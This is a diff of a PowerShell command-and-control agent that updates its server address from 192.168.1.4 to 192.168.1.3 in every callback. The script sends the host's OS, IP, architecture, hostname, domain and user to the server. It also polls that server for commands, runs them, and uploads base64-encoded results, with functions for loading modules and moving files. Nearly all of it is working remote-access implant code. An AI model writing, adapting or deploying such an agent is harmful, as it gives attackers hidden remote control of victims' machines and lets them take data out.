@@ -9,7 +9,7 @@ $agent = "$random-img.jpeg"
 $finaldata = "$os**$IP**$arch**$hostname**$domain**$whoami"
 $h3 = new-object net.WebClient
 $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-$h = $h3.UploadString("http://192.168.1.4:9090/info/$agent", "data="+$finaldata)
+$h = $h3.UploadString("http://192.168.1.3:9090/info/$agent", "data="+$finaldata)
 
 $h2 = New-Object system.Net.WebClient;
 $h3 = New-Object system.Net.WebClient;
@@ -23,7 +23,7 @@ function load($module)
 	$handle = new-object net.WebClient;
 	$handleh = $handle.Headers;
 	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
-	$modulecontent = $handle.UploadString("http://192.168.1.4:9090/md/$agent", "data="+"$module");
+	$modulecontent = $handle.UploadString("http://192.168.1.3:9090/md/$agent", "data="+"$module");
 	
 	
 	
@@ -38,7 +38,7 @@ function Download($file)
 	$handle = new-object net.WebClient;
 	$handleh = $handle.Headers;
 	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
-	$modulecontent = $handle.UploadString("http://192.168.1.4:9090/up/$agent", "data="+"$file");
+	$modulecontent = $handle.UploadString("http://192.168.1.3:9090/up/$agent", "data="+"$file");
 	return $modulecontent
 }
 
@@ -50,20 +50,20 @@ function upload($file)
 	$handle = new-object net.WebClient;
 	$handleh = $handle.Headers;
 	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
-	$modulecontent = $handle.UploadString("http://192.168.1.4:9090/img/$agent", "data="+"$file");
+	$modulecontent = $handle.UploadString("http://192.168.1.3:9090/img/$agent", "data="+"$file");
 	return $modulecontent
 }
 
 
 while ($true)
 {
-	$cmd = $h2.downloadString("http://192.168.1.4:9090/cm/$agent");
+	$cmd = $h2.downloadString("http://192.168.1.3:9090/cm/$agent");
 	#echo $cmd
 	if ($cmd -eq "REGISTER")
 	{
 		$h3 = new-object net.WebClient
 		$h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-		$h3.UploadString("http://192.168.1.4:9090/info/$agent", "data="+$finaldata)
+		$h3.UploadString("http://192.168.1.3:9090/info/$agent", "data="+$finaldata)
 		continue
 	}
 	if ($cmd -eq "")
@@ -139,7 +139,7 @@ while ($true)
 	$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
 	$redata = [System.Convert]::ToBase64String($bytes)
     $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-	$re = $h3.UploadString("http://192.168.1.4:9090/re/$agent", "data="+$redata);
+	$re = $h3.UploadString("http://192.168.1.3:9090/re/$agent", "data="+$redata);
 	
 }
 
